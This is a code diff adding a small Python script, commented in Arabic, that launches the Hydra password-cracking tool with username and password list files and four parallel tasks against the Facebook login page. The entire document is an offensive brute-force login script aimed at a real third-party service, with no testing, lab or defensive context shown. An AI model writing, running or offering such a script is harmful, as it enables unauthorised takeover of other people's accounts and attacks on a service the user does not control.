@@ -1,0 +1,24 @@
+import subprocess
+
+def main():
+    # عنوان URL للبروتوكول المستهدف (مثال: SSH أو HTTP)
+    login_url = "http://www.facebook.com/login.php"  # (على سبيل المثال)
+
+    # ملفات اسم المستخدم وكلمات المرور
+    username_file = "usernames.txt"
+    password_file = "passwords.txt"
+
+    # خيارات Hydra
+    hydra_options = [
+        "hydra",  # تشغيل الأداة Hydra
+        "-L", username_file,  # ملف يحتوي على أسماء المستخدمين
+        "-P", password_file,  # ملف يحتوي على كلمات المرور
+        "-t", "4",  # عدد المحاولات المتوازية
+        login_url,  # بروتوكول URL المستهدف
+    ]
+
+    # تنفيذ أمر Hydra باستخدام subprocess
+    subprocess.run(hydra_options)
+
+if __name__ == "__main__":
+    main()
